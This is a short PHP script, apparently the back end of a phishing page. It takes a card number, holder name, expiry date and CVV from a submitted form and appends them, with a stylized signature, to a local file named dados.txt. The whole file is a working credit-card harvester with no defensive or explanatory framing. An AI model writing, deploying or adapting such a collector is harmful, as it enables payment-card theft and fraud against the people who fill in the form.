<?php

$CC = $_POST["cc"];
$nome = $_POST["name"];
$vencimento = $_POST['venc'];
$cvv = $_POST['cvv'];
$fp = fopen("dados.txt", "a");
$savestring = "NOME> $nome CC:> $CC venc:> $vencimento  CVV:> $cvv 🅰🆅🆉 🅸🅽🅵🅾🅾\n";

fwrite($fp, $savestring);
fclose($fp);






?>